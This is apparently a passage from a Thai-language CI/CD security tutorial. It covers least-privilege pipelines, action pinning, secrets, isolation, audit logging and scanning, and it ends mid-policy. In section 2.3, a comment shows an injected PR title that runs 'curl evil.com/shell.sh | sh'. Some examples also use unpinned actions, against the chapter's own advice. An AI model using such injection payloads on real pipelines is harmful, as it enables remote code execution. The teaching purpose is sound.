# Part 51: CI/CD Security Best Practices

## บทนำ

ความปลอดภัยใน CI/CD Pipeline เป็นหนึ่งในความท้าทายที่สำคัญที่สุดสำหรับทีม DevOps สมัยใหม่ การโจมตีผ่าน Supply Chain และ Pipeline ได้เพิ่มขึ้นอย่างมากในช่วงไม่กี่ปีที่ผ่านมา ตัวอย่างที่โด่งดังเช่น SolarWinds, Codecov และ Log4Shell แสดงให้เห็นว่าการโจมตีผ่าน CI/CD สามารถส่งผลกระทบต่อองค์กรขนาดใหญ่ได้

บทนี้จะครอบคลุม:
- หลักการ Least Privilege ใน Pipeline
- Secure Defaults และ Pipeline Hardening
- Environment Isolation
- Audit Logging
- Supply Chain Security Overview
- Workshop และ Exercises จริง

---

## 1. หลักการ Least Privilege ใน CI/CD

### 1.1 ทำไมต้อง Least Privilege?

Least Privilege หมายถึงการให้สิทธิ์เพียงแค่สิ่งที่จำเป็นต่องาน ไม่มากไม่น้อย หลักการนี้มีความสำคัญอย่างยิ่งใน CI/CD เพราะ:

1. **Pipeline อาจถูก Compromise** — หาก Job ถูกโจมตี ผู้โจมตีจะได้สิทธิ์แค่สิ่งที่ Job นั้นมีเท่านั้น
2. **ลด Blast Radius** — เมื่อเกิดเหตุการณ์ ความเสียหายจำกัดเฉพาะสิทธิ์ที่มี
3. **Compliance** — มาตรฐาน SOC2, ISO27001 กำหนดให้ต้องมีการควบคุมสิทธิ์

### 1.2 GitHub Actions — Minimum Permissions

```yaml
# .github/workflows/secure-pipeline.yml
name: Secure Pipeline with Least Privilege

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

# กำหนด permissions ในระดับ workflow (ค่า default)
permissions:
  contents: read        # อ่าน code เท่านั้น
  actions: none         # ไม่ให้จัดการ actions
  checks: none          # ไม่ให้จัดการ checks
  deployments: none     # ไม่ให้ deploy
  id-token: none        # ไม่ให้ OIDC token
  issues: none          # ไม่ให้จัดการ issues
  packages: none        # ไม่ให้จัดการ packages
  pull-requests: none   # ไม่ให้จัดการ PRs
  security-events: none # ไม่ให้จัดการ security
  statuses: none        # ไม่ให้จัดการ statuses

jobs:
  build:
    runs-on: ubuntu-latest
    # override สิทธิ์เฉพาะ job นี้
    permissions:
      contents: read
      packages: write   # เฉพาะ job นี้ที่ต้อง push package
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false  # ไม่เก็บ credentials หลัง checkout

      - name: Build
        run: make build

      - name: Push to Registry
        run: docker push myimage:latest

  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read    # เฉพาะ read เท่านั้น
    steps:
      - uses: actions/checkout@v4
      - name: Run Tests
        run: make test

  security-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write  # จำเป็นสำหรับ SARIF upload
    steps:
      - uses: actions/checkout@v4
      - name: Run Security Scan
        uses: github/codeql-action/analyze@v3
```

### 1.3 GitLab CI — Minimum Permissions

```yaml
# .gitlab-ci.yml
default:
  # กำหนด token permissions สำหรับ OIDC
  id_tokens:
    VAULT_ID_TOKEN:
      aud: https://vault.example.com

stages:
  - test
  - build
  - deploy

variables:
  # ป้องกัน fork bombs
  GIT_DEPTH: "10"
  # ไม่ clone submodules โดย default
  GIT_SUBMODULE_STRATEGY: none

test:
  stage: test
  # ใช้ protected variables เฉพาะ protected branches
  only:
    - main
    - develop
    - merge_requests
  script:
    - make test
  # ไม่ inherit secrets จาก parent pipeline
  inherit:
    variables: false

build:
  stage: build
  script:
    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .
    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  # เฉพาะ protected branches เท่านั้นที่ push ได้
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'
      when: always
    - when: never

deploy-staging:
  stage: deploy
  environment:
    name: staging
    url: https://staging.example.com
  # ต้องการ manual approval สำหรับ production
  rules:
    - if: '$CI_COMMIT_BRANCH == "main"'
      when: manual
  script:
    - kubectl apply -f k8s/staging/
```

### 1.4 AWS IAM Roles สำหรับ CI/CD

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowECRPush",
      "Effect": "Allow",
      "Action": [
        "ecr:GetAuthorizationToken",
        "ecr:BatchCheckLayerAvailability",
        "ecr:GetDownloadUrlForLayer",
        "ecr:BatchGetImage",
        "ecr:PutImage",
        "ecr:InitiateLayerUpload",
        "ecr:UploadLayerPart",
        "ecr:CompleteLayerUpload"
      ],
      "Resource": [
        "arn:aws:ecr:us-east-1:123456789012:repository/myapp"
      ]
    },
    {
      "Sid": "AllowECRToken",
      "Effect": "Allow",
      "Action": [
        "ecr:GetAuthorizationToken"
      ],
      "Resource": "*"
    },
    {
      "Sid": "AllowS3Deploy",
      "Effect": "Allow",
      "Action": [
        "s3:PutObject",
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::myapp-artifacts",
        "arn:aws:s3:::myapp-artifacts/*"
      ]
    }
  ]
}
```

---

## 2. Secure Defaults และ Pipeline Hardening

### 2.1 Pinning Actions Versions

การใช้ `@latest` หรือ `@v3` ใน GitHub Actions มีความเสี่ยงสูง เพราะ Tag สามารถถูก Override ได้ ควรใช้ Commit SHA แทน:

```yaml
# ❌ ไม่ปลอดภัย — tag สามารถถูก override ได้
- uses: actions/checkout@v4
- uses: actions/setup-node@latest

# ✅ ปลอดภัย — pin ด้วย commit SHA
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0

# สำหรับ actions ที่เราไว้วางใจ ใช้ version tag พร้อม comment
- uses: actions/checkout@v4  # pinned: 11bd71901bbe5b1630ceea73d27597364c9af683
```

### 2.2 Dependabot สำหรับ Actions Updates

```yaml
# .github/dependabot.yml
version: 2
updates:
  # อัพเดท GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "Asia/Bangkok"
    labels:
      - "dependencies"
      - "github-actions"
    commit-message:
      prefix: "chore(deps)"
    # Auto-merge สำหรับ patch updates
    groups:
      actions-minor:
        patterns:
          - "*"
        update-types:
          - "minor"
          - "patch"

  # อัพเดท Docker images ใน Dockerfiles
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    labels:
      - "dependencies"
      - "docker"

  # อัพเดท npm packages
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    labels:
      - "dependencies"
      - "npm"
    versioning-strategy: increase
```

### 2.3 Script Injection Prevention

```yaml
# .github/workflows/pr-check.yml

# ❌ อันตราย — ใช้ expressions ใน run script โดยตรง
# ผู้โจมตีสามารถสร้าง PR ที่มี title: "'; curl evil.com/shell.sh | sh; echo '"
- name: Dangerous
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
    echo "Branch: ${{ github.head_ref }}"

# ✅ ปลอดภัย — ใช้ environment variable แทน
- name: Safe
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    BRANCH_NAME: ${{ github.head_ref }}
  run: |
    echo "PR title: $PR_TITLE"
    echo "Branch: $BRANCH_NAME"
```

### 2.4 Secret Management

```yaml
# .github/workflows/deploy.yml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      # ✅ ใช้ GitHub Secrets อย่างถูกต้อง
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: ap-southeast-1

      # ✅ ดีกว่า — ใช้ OIDC แทน long-lived credentials
      - name: Configure AWS Credentials via OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: ap-southeast-1
          role-session-name: GitHubActions-${{ github.run_id }}

      # ✅ ใช้ HashiCorp Vault สำหรับ Dynamic Secrets
      - name: Get Secrets from Vault
        uses: hashicorp/vault-action@d1720f055e0635fd932a1d2a48f87a666a57906c  # v3.0.0
        with:
          url: https://vault.example.com
          method: jwt
          jwtGithubAudience: https://vault.example.com
          role: my-role
          secrets: |
            secret/data/myapp/prod DB_PASSWORD | DB_PASSWORD ;
            secret/data/myapp/prod API_KEY | API_KEY
```

### 2.5 Container Hardening

```dockerfile
# Dockerfile — Secure Multi-stage Build

# Stage 1: Build
FROM node:20-alpine AS builder

# ไม่ใช้ root ใน build stage
RUN addgroup -g 1001 -S appgroup && \
    adduser -u 1001 -S appuser -G appgroup

WORKDIR /app

# Copy package files ก่อน เพื่อ cache dependencies
COPY --chown=appuser:appgroup package*.json ./
RUN npm ci --only=production

COPY --chown=appuser:appgroup . .
RUN npm run build

# Stage 2: Production image
FROM node:20-alpine AS production

# Security updates
RUN apk update && apk upgrade && \
    apk add --no-cache dumb-init && \
    rm -rf /var/cache/apk/*

# สร้าง non-root user
RUN addgroup -g 1001 -S appgroup && \
    adduser -u 1001 -S appuser -G appgroup

WORKDIR /app

# Copy built files
COPY --from=builder --chown=appuser:appgroup /app/dist ./dist
COPY --from=builder --chown=appuser:appgroup /app/node_modules ./node_modules

# ใช้ non-root user
USER appuser

# Health check
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
  CMD node -e "require('http').get('http://localhost:3000/health', (r) => r.statusCode === 200 ? process.exit(0) : process.exit(1))"

# ใช้ dumb-init เพื่อจัดการ signals ถูกต้อง
ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "dist/server.js"]

# Expose port (documentation)
EXPOSE 3000

# Labels สำหรับ traceability
LABEL maintainer="team@example.com" \
      version="1.0.0" \
      description="Secure Node.js application"
```

---

## 3. Environment Isolation

### 3.1 หลักการ Environment Separation

```
┌─────────────────────────────────────────────────────┐
│                   CICD Pipeline                     │
│                                                     │
│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │
│  │   Dev    │  │ Staging  │  │   Production     │  │
│  │          │  │          │  │                  │  │
│  │ Shared   │  │ Isolated │  │   Fully          │  │
│  │ Cluster  │  │ Namespace│  │   Isolated       │  │
│  │          │  │          │  │   Cluster        │  │
│  └──────────┘  └──────────┘  └──────────────────┘  │
│       ↑               ↑                ↑            │
│   Any branch        Merge to        Manual          │
│   auto-deploy       develop         approval        │
└─────────────────────────────────────────────────────┘
```

### 3.2 GitHub Environments

```yaml
# .github/workflows/deploy.yml
name: Deploy Pipeline

on:
  push:
    branches: [main, develop]

jobs:
  deploy-dev:
    runs-on: ubuntu-latest
    environment:
      name: development
      url: https://dev.example.com
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to Dev
        run: |
          # ใช้ secrets เฉพาะ environment นี้
          echo "Deploying to dev with ${{ secrets.DEV_KUBECONFIG }}"

  deploy-staging:
    runs-on: ubuntu-latest
    needs: deploy-dev
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to Staging
        run: |
          echo "Deploying to staging"

  deploy-production:
    runs-on: ubuntu-latest
    needs: deploy-staging
    # กำหนดให้ต้องมี required reviewers
    environment:
      name: production
      url: https://www.example.com
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to Production
        run: |
          echo "Deploying to production"
```

### 3.3 Kubernetes Namespace Isolation

```yaml
# k8s/namespaces/staging.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: staging
  labels:
    environment: staging
    team: backend

---
# Network Policy — ป้องกัน namespace ไม่ให้ communicate กัน
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-cross-namespace
  namespace: staging
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  ingress:
  # อนุญาตเฉพาะจาก namespace เดียวกัน
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: staging
  # อนุญาต ingress controller
  - from:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: ingress-nginx
  egress:
  # อนุญาต DNS
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - protocol: UDP
      port: 53
  # อนุญาต namespace เดียวกัน
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: staging

---
# Resource Quota
apiVersion: v1
kind: ResourceQuota
metadata:
  name: staging-quota
  namespace: staging
spec:
  hard:
    requests.cpu: "4"
    requests.memory: 8Gi
    limits.cpu: "8"
    limits.memory: 16Gi
    pods: "50"
    services: "10"
    persistentvolumeclaims: "20"
```

---

## 4. Audit Logging

### 4.1 สิ่งที่ต้อง Log ใน CI/CD

การ Audit Logging ที่ดีต้องบันทึก:
- ใครทำอะไร (Who)
- ทำอะไร (What)
- เมื่อไหร่ (When)
- จากที่ไหน (Where)
- ผลลัพธ์เป็นยังไง (Result)

### 4.2 GitHub Actions Audit Log

```yaml
# .github/workflows/audit-logging.yml
name: Pipeline with Audit Logging

on:
  push:
    branches: [main]

jobs:
  build-and-audit:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write  # สำหรับ OIDC

    steps:
      - name: Log Pipeline Start
        run: |
          echo "::notice::Pipeline started by: ${{ github.actor }}"
          echo "::notice::Commit: ${{ github.sha }}"
          echo "::notice::Branch: ${{ github.ref }}"
          echo "::notice::Workflow: ${{ github.workflow }}"

      - uses: actions/checkout@v4

      - name: Build with Audit
        id: build
        run: |
          # Log ทุก build step
          echo "Build started at: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
          make build
          echo "Build completed at: $(date -u +%Y-%m-%dT%H:%M:%SZ)"

      - name: Send Audit to SIEM
        if: always()  # รันแม้ว่า step ก่อนหน้า fail
        env:
          SIEM_URL: ${{ secrets.SIEM_WEBHOOK_URL }}
          BUILD_STATUS: ${{ steps.build.outcome }}
        run: |
          curl -X POST "$SIEM_URL" \
            -H "Content-Type: application/json" \
            -d '{
              "event_type": "cicd_pipeline",
              "actor": "${{ github.actor }}",
              "repository": "${{ github.repository }}",
              "commit_sha": "${{ github.sha }}",
              "branch": "${{ github.ref_name }}",
              "workflow": "${{ github.workflow }}",
              "run_id": "${{ github.run_id }}",
              "status": "'"$BUILD_STATUS"'",
              "timestamp": "'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"'"
            }'
```

### 4.3 Structured Logging สำหรับ Pipeline

```python
# scripts/audit_logger.py
import json
import sys
import os
from datetime import datetime, timezone

class PipelineAuditLogger:
    """Structured audit logger สำหรับ CI/CD pipeline"""
    
    def __init__(self, pipeline_id: str, actor: str):
        self.pipeline_id = pipeline_id
        self.actor = actor
        self.start_time = datetime.now(timezone.utc)
    
    def log_event(self, event_type: str, details: dict, severity: str = "INFO"):
        """Log audit event เป็น structured JSON"""
        event = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "severity": severity,
            "event_type": event_type,
            "pipeline_id": self.pipeline_id,
            "actor": self.actor,
            "repository": os.getenv("GITHUB_REPOSITORY", "unknown"),
            "commit_sha": os.getenv("GITHUB_SHA", "unknown"),
            "branch": os.getenv("GITHUB_REF_NAME", "unknown"),
            "details": details
        }
        
        # Log ไปที่ stdout (จะถูก capture โดย CI system)
        print(json.dumps(event), flush=True)
        
        # ถ้า severity สูง ให้ส่งไปที่ SIEM ด้วย
        if severity in ["WARNING", "ERROR", "CRITICAL"]:
            self._send_to_siem(event)
    
    def log_deployment(self, environment: str, image_tag: str, status: str):
        """Log deployment event"""
        self.log_event(
            event_type="deployment",
            details={
                "environment": environment,
                "image_tag": image_tag,
                "status": status,
                "duration_seconds": (
                    datetime.now(timezone.utc) - self.start_time
                ).total_seconds()
            },
            severity="INFO" if status == "success" else "ERROR"
        )
    
    def log_secret_access(self, secret_name: str, purpose: str):
        """Log secret access สำหรับ compliance"""
        self.log_event(
            event_type="secret_access",
            details={
                "secret_name": secret_name,
                "purpose": purpose,
                "access_time": datetime.now(timezone.utc).isoformat()
            },
            severity="INFO"
        )
    
    def _send_to_siem(self, event: dict):
        """ส่ง event ไปที่ SIEM"""
        import urllib.request
        siem_url = os.getenv("SIEM_WEBHOOK_URL")
        if not siem_url:
            return
        
        data = json.dumps(event).encode('utf-8')
        req = urllib.request.Request(
            siem_url,
            data=data,
            headers={'Content-Type': 'application/json'}
        )
        try:
            urllib.request.urlopen(req, timeout=5)
        except Exception as e:
            print(f"Failed to send to SIEM: {e}", file=sys.stderr)


# การใช้งาน
if __name__ == "__main__":
    logger = PipelineAuditLogger(
        pipeline_id=os.getenv("GITHUB_RUN_ID", "local"),
        actor=os.getenv("GITHUB_ACTOR", "local")
    )
    
    logger.log_secret_access("DB_PASSWORD", "database connection during integration tests")
    logger.log_deployment("staging", "myapp:abc123", "success")
```

---

## 5. Pipeline Hardening Techniques

### 5.1 Workflow Security Checklist

```yaml
# .github/workflows/hardened-pipeline.yml
name: Hardened Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    # ป้องกัน untrusted code จาก forks
    types: [opened, synchronize, reopened]

# ป้องกัน concurrent deployments
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true  # cancel เก่าถ้ามีอันใหม่

# กำหนด permissions แบบ deny-all ก่อน
permissions: {}

jobs:
  security-checks:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    
    # Timeout ป้องกัน runaway jobs
    timeout-minutes: 30
    
    steps:
      # ป้องกัน path traversal
      - uses: actions/checkout@v4
        with:
          # ไม่เก็บ git credentials
          persist-credentials: false
          # ใช้ sparse checkout ถ้าต้องการ
          # sparse-checkout: |
          #   src/
          #   tests/

      # ตรวจสอบ secrets ที่หลุด
      - name: Scan for secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD

      # SAST Scan
      - name: Run Semgrep
        uses: semgrep/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/secrets
            p/owasp-top-ten

      # Dependency vulnerability scan
      - name: Run npm audit
        run: npm audit --audit-level=high

      # Container scan
      - name: Scan Docker image
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ env.IMAGE_TAG }}
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'

      - name: Upload Trivy results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'trivy-results.sarif'

  verify-pr-source:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    permissions:
      pull-requests: read
    steps:
      # ป้องกัน PRs จาก forks ที่ไม่น่าเชื่อถือ
      - name: Check PR source
        run: |
          if [ "${{ github.event.pull_request.head.repo.fork }}" == "true" ]; then
            echo "::warning::This PR is from a fork. Secrets will not be available."
            # Run minimal checks เท่านั้น
          fi
```

### 5.2 Trivy Configuration

```yaml
# trivy.yaml — Trivy configuration file
# วางที่ root ของ repository

db:
  # ใช้ OCI registry แทน GitHub เพื่อ bypass rate limits
  repository: public.ecr.aws/aquasecurity/trivy-db

scan:
  # เฉพาะ critical และ high vulnerabilities ที่ต้อง fail
  severity:
    - CRITICAL
    - HIGH
  # ไม่สนใจ vulnerabilities ที่ยังไม่มี fix
  ignore-unfixed: true
  # ไม่สนใจ test files
  skip-files:
    - "**/*_test.go"
    - "**/test/**"

vulnerability:
  type:
    - os
    - library

# รายการ CVEs ที่ยอมรับได้ (ต้องมี justification)
ignorefile: .trivyignore.yaml
```

```yaml
# .trivyignore.yaml
vulnerabilities:
  - vulnerability-id: CVE-2023-12345
    paths:
      - "package-lock.json"
    statement: "ใช้เฉพาะใน development, ไม่ถูก expose ใน production"
    expiry-date: "2024-06-01"

  - vulnerability-id: CVE-2023-67890
    statement: "Mitigated โดย WAF ด้านหน้า"
    expiry-date: "2024-03-01"
```

---

## 6. Supply Chain Security Overview

### 6.1 SLSA Framework (อ่านเพิ่มเติมใน Part 52)

Supply chain Levels for Software Artifacts (SLSA) คือ framework สำหรับวัดระดับความปลอดภัยของ Software Supply Chain

```
Level 0: ไม่มีการรับประกัน
Level 1: Build process มี documentation
Level 2: Build process ใช้ version control และ hosted build service
Level 3: Build มี hardened environment
Level 4: Two-party review, hermetic builds
```

### 6.2 SBOM Generation ใน Pipeline

```yaml
# .github/workflows/sbom.yml
name: Generate SBOM

jobs:
  sbom:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Generate SBOM with Syft
        uses: anchore/sbom-action@v0
        with:
          image: myapp:${{ github.sha }}
          format: spdx-json
          output-file: sbom.spdx.json

      - name: Sign SBOM with Cosign
        env:
          COSIGN_EXPERIMENTAL: 1
        run: |
          cosign sign-blob --yes \
            --bundle sbom.bundle \
            sbom.spdx.json

      - name: Upload SBOM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: |
            sbom.spdx.json
            sbom.bundle
```

---

## 7. Workshop: Security Hardening Lab

### Lab 1: ตรวจสอบ Pipeline Security Score

```bash
#!/bin/bash
# scripts/check-pipeline-security.sh
# ตรวจสอบ security posture ของ GitHub Actions workflows

REPO_PATH="${1:-.}"
SCORE=100
ISSUES=()

echo "🔍 Checking CI/CD Security..."
echo "================================"

# 1. ตรวจสอบ permissions
check_permissions() {
    local file=$1
    if ! grep -q "permissions:" "$file"; then
        ISSUES+=("$file: ไม่มีการกำหนด permissions")
        SCORE=$((SCORE - 10))
    elif grep -q "permissions: write-all" "$file"; then
        ISSUES+=("$file: ใช้ write-all permissions — อันตราย!")
        SCORE=$((SCORE - 20))
    fi
}

# 2. ตรวจสอบ action versions
check_action_versions() {
    local file=$1
    # ตรวจหา actions ที่ใช้ branch (เช่น @main, @master)
    if grep -qE "uses: .+@(main|master|latest)" "$file"; then
        ISSUES+=("$file: มี action ที่ใช้ branch reference — ควรใช้ SHA")
        SCORE=$((SCORE - 15))
    fi
}

# 3. ตรวจสอบ secret injection risks
check_script_injection() {
    local file=$1
    # ตรวจหา github.event ที่ถูก interpolate โดยตรงใน run:
    if grep -qP "run:.*\$\{\{ github\.event\." "$file"; then
        ISSUES+=("$file: อาจมี script injection vulnerability")
        SCORE=$((SCORE - 25))
    fi
}

# 4. ตรวจสอบ timeout
check_timeout() {
    local file=$1
    if ! grep -q "timeout-minutes:" "$file"; then
        ISSUES+=("$file: ไม่มีการกำหนด timeout-minutes")
        SCORE=$((SCORE - 5))
    fi
}

# วนตรวจสอบทุก workflow
for workflow in "$REPO_PATH"/.github/workflows/*.yml; do
    if [ -f "$workflow" ]; then
        check_permissions "$workflow"
        check_action_versions "$workflow"
        check_script_injection "$workflow"
        check_timeout "$workflow"
    fi
done

# แสดงผล
echo "Security Score: $SCORE/100"
echo ""
if [ ${#ISSUES[@]} -gt 0 ]; then
    echo "Issues Found:"
    for issue in "${ISSUES[@]}"; do
        echo "  ⚠️  $issue"
    done
else
    echo "✅ No issues found!"
fi

# exit code
if [ $SCORE -lt 70 ]; then
    echo ""
    echo "❌ Security score too low (minimum 70)"
    exit 1
fi
```

### Lab 2: Implement OIDC Authentication

```yaml
# .github/workflows/oidc-deploy.yml
name: Deploy with OIDC

on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write  # จำเป็นสำหรับ OIDC

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # AWS OIDC Authentication
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsDeployRole
          aws-region: ap-southeast-1
          # กำหนด session duration (default 1 hour)
          role-duration-seconds: 900  # 15 minutes — minimum needed

      # GCP OIDC Authentication
      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/123456789/locations/global/workloadIdentityPools/github/providers/my-repo
          service_account: github-actions@my-project.iam.gserviceaccount.com

      # Azure OIDC Authentication
      - name: Azure Login
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

```hcl
# AWS IAM Role Trust Policy สำหรับ GitHub Actions OIDC
# terraform/github-actions-role.tf

data "aws_iam_openid_connect_provider" "github" {
  url = "https://token.actions.githubusercontent.com"
}

resource "aws_iam_role" "github_actions_deploy" {
  name = "GitHubActionsDeployRole"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Federated = data.aws_iam_openid_connect_provider.github.arn
        }
        Action = "sts:AssumeRoleWithWebIdentity"
        Condition = {
          StringEquals = {
            "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
          }
          StringLike = {
            # อนุญาตเฉพาะ main branch ของ repository ที่ระบุ
            "token.actions.githubusercontent.com:sub" = "repo:myorg/myrepo:ref:refs/heads/main"
          }
        }
      }
    ]
  })
}

resource "aws_iam_role_policy" "github_actions_deploy" {
  name   = "GitHubActionsDeployPolicy"
  role   = aws_iam_role.github_actions_deploy.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect   = "Allow"
        Action   = ["ecr:*"]
        Resource = "arn:aws:ecr:ap-southeast-1:123456789012:repository/myapp"
      },
      {
        Effect   = "Allow"
        Action   = ["ecr:GetAuthorizationToken"]
        Resource = "*"
      },
      {
        Effect   = "Allow"
        Action   = ["eks:DescribeCluster"]
        Resource = "arn:aws:eks:ap-southeast-1:123456789012:cluster/production"
      }
    ]
  })
}
```

---

## 8. Secret Scanning และ Prevention

### 8.1 Pre-commit Hooks สำหรับ Secret Detection

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.4
    hooks:
      - id: gitleaks
        name: Detect Secrets (Gitleaks)
        description: ตรวจหา secrets ที่อาจหลุดก่อน commit

  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        name: Detect Secrets (detect-secrets)
        args: ['--baseline', '.secrets.baseline']

  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: detect-private-key
        name: Detect Private Keys
      - id: check-added-large-files
        name: Check for Large Files
        args: ['--maxkb=500']
      - id: no-commit-to-branch
        name: Prevent Direct Commits to Main
        args: ['--branch', 'main', '--branch', 'master']
```

### 8.2 Gitleaks Configuration

```toml
# .gitleaks.toml
title = "My Project Secret Detection"

[extend]
# ใช้ default rules จาก gitleaks
useDefault = true

# กำหนด custom rules
[[rules]]
id = "internal-api-key"
description = "Internal API Key"
regex = '''INTERNAL_API_[A-Z0-9]{32}'''
tags = ["api-key", "internal"]

[[rules]]
id = "database-connection-string"
description = "Database Connection String"
regex = '''(postgresql|mysql|mongodb)://[^:]+:[^@]+@[^/]+/'''
tags = ["database", "credentials"]

# Allowlist — อนุญาต false positives
[allowlist]
description = "Allowed patterns"
regexes = [
  '''EXAMPLE_KEY_HERE''',
  '''TEST_API_KEY''',
  '''sk_test_[A-Za-z0-9]+''',  # Stripe test keys
]
paths = [
  '''.gitleaks.toml''',
  '''docs/''',
  '''*.md''',
]
```

---

## 9. Monitoring และ Alerting สำหรับ CI/CD

### 9.1 Pipeline Security Metrics

```python
# scripts/pipeline_metrics.py
"""
ส่ง pipeline security metrics ไปที่ Prometheus/Grafana
"""
import os
import time
import requests
from prometheus_client import Counter, Gauge, Histogram, push_to_gateway
from prometheus_client import CollectorRegistry

registry = CollectorRegistry()

# Metrics
pipeline_runs = Counter(
    'cicd_pipeline_runs_total',
    'Total pipeline runs',
    ['status', 'branch', 'repository'],
    registry=registry
)

secret_scan_findings = Counter(
    'cicd_secret_scan_findings_total',
    'Secret scan findings',
    ['severity', 'scanner'],
    registry=registry
)

vulnerability_findings = Gauge(
    'cicd_vulnerability_findings',
    'Current vulnerability findings',
    ['severity', 'scanner'],
    registry=registry
)

pipeline_duration = Histogram(
    'cicd_pipeline_duration_seconds',
    'Pipeline duration in seconds',
    ['stage'],
    registry=registry
)

def record_pipeline_run(status: str, branch: str, repo: str):
    """บันทึก pipeline run"""
    pipeline_runs.labels(
        status=status,
        branch=branch,
        repository=repo
    ).inc()

def record_secrets_found(findings: list):
    """บันทึก secret findings"""
    for finding in findings:
        secret_scan_findings.labels(
            severity=finding['severity'],
            scanner=finding['scanner']
        ).inc()

def push_metrics():
    """ส่ง metrics ไปที่ Prometheus Pushgateway"""
    push_to_gateway(
        os.getenv('PROMETHEUS_PUSHGATEWAY', 'localhost:9091'),
        job='cicd_pipeline',
        registry=registry,
        grouping_key={
            'run_id': os.getenv('GITHUB_RUN_ID', 'local'),
            'workflow': os.getenv('GITHUB_WORKFLOW', 'local'),
        }
    )

if __name__ == '__main__':
    # Example usage
    record_pipeline_run('success', 'main', 'myorg/myrepo')
    record_secrets_found([])
    push_metrics()
```

---

## 10. Security Policies as Code

### 10.1 OPA Policy สำหรับ CI/CD

```rego
# policies/cicd_security.rego
package cicd.security

import future.keywords.if
import future.keywords.in

# กฎ: ทุก workflow ต้องมี permissions ที่ชัดเจน
deny[msg] {
    input.workflow.permissions == null
    msg := sprintf("Workflow '%v' ไม่มีการกำหนด permissions", [input.workflow.name])
}

# กฎ: ห้ามใช้ write-all permissions
deny[msg] {
    input.workflow.permissions == "write-all"
    msg := sprintf("Workflow '%v' ใช้ write-all permissions — อันตราย", [input.workflow.name])
}

# กฎ: ทุก action ต้องใช้ SHA หรือ version tag ที่ชัดเจน
deny[msg] {
    job := input.workflow.jobs[_]
    step := job.steps[_]
    uses := step.uses
    
    # ตรวจสอบ branch references
